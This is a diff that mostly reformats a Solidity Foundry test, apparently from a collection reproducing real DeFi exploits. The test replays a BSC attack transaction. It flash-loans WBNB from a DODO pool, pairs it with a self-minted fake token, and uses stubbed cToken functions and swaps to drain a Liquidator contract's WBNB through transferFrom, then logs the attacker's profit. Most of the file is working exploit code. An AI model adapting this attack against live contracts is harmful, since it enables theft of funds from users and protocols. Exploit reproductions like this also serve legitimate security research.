@@ -3,7 +3,7 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
-import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {IERC20} from "src/interfaces/IERC20.sol";
 
 import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
 import {IUniswapV2Factory} from "src/interfaces/IUniswapV2Factory.sol";
@@ -15,10 +15,11 @@ import {IDVM} from "src/interfaces/IDVM.sol";
 // https://bscscan.com/tx/0x3757d177482171dcfad7066c5e88d6f0f0fe74b28f32e41dd77137cad859c777
 
 contract ContractTest is Test {
-
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
-    IUniswapV2Router Router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
-    IUniswapV2Factory Factory = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
+    IUniswapV2Router Router =
+        IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+    IUniswapV2Factory Factory =
+        IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
     address Token;
     uint256 WBNBAmount;
     address Pair;
@@ -35,18 +36,38 @@ contract ContractTest is Test {
         MyToken.mint(10 * 1e18);
         IDVM(dodo).flashLoan(8 * 1e18, 0, address(this), new bytes(1));
 
-        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
+        emit log_named_decimal_uint(
+            "[End] Attacker WBNB balance after exploit",
+            WBNB.balanceOf(address(this)),
+            18
+        );
     }
 
-    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
+    function DPPFlashLoanCall(
+        address sender,
+        uint256 baseAmount,
+        uint256 quoteAmount,
+        bytes calldata data
+    ) external {
         IERC20(Token).approve(address(Router), type(uint256).max);
         WBNB.approve(address(Router), type(uint256).max);
         Router.addLiquidity(
-            address(Token), address(WBNB), 8 * 1e18, 8 * 1e18, 0, 0, address(this), block.timestamp + 60
+            address(Token),
+            address(WBNB),
+            8 * 1e18,
+            8 * 1e18,
+            0,
+            0,
+            address(this),
+            block.timestamp + 60
         );
         Pair = Factory.getPair(Token, address(WBNB));
         WBNBAmount = WBNB.balanceOf(Liquidator);
-        bytes memory data1 = abi.encode(address(this), address(this), address(this));
+        bytes memory data1 = abi.encode(
+            address(this),
+            address(this),
+            address(this)
+        );
         if (IUniswapV2Pair(Pair).token0() == address(WBNB)) {
             IUniswapV2Pair(Pair).swap(WBNBAmount, 0, Liquidator, data1);
         } else {
@@ -62,15 +83,19 @@ contract ContractTest is Test {
             address(this),
             block.timestamp + 60
         );
-        WBNB.transferFrom(Liquidator, address(this), WBNB.balanceOf(Liquidator));
+        WBNB.transferFrom(
+            Liquidator,
+            address(this),
+            WBNB.balanceOf(Liquidator)
+        );
         WBNB.transfer(dodo, 8 * 1e18);
     }
 
-    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral)
-        external
-        pure
-        returns (uint256)
-    {
+    function liquidateBorrow(
+        address borrower,
+        uint256 repayAmount,
+        address cTokenCollateral
+    ) external pure returns (uint256) {
         return 0;
     }
 
@@ -81,11 +106,9 @@ contract ContractTest is Test {
     function redeem(uint256 redeemTokens) external pure returns (uint256) {
         return 0;
     }
-
 }
 
 contract MyERC20 {
-
     uint256 public totalSupply;
     mapping(address => uint256) public balanceOf;
     mapping(address => mapping(address => uint256)) public allowance;
@@ -94,9 +117,16 @@ contract MyERC20 {
     uint8 public decimals = 18;
 
     event Transfer(address indexed from, address indexed to, uint256 value);
-    event Approval(address indexed owner, address indexed spender, uint256 value);
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
 
-    function transfer(address recipient, uint256 amount) external returns (bool) {
+    function transfer(
+        address recipient,
+        uint256 amount
+    ) external returns (bool) {
         balanceOf[msg.sender] -= amount;
         balanceOf[recipient] += amount;
         emit Transfer(msg.sender, recipient, amount);
@@ -109,7 +139,11 @@ contract MyERC20 {
         return true;
     }
 
-    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool) {
         allowance[sender][msg.sender] -= amount;
         balanceOf[sender] -= amount;
         balanceOf[recipient] += amount;
@@ -128,5 +162,4 @@ contract MyERC20 {
         totalSupply -= amount;
         emit Transfer(msg.sender, address(0), amount);
     }
-
 }
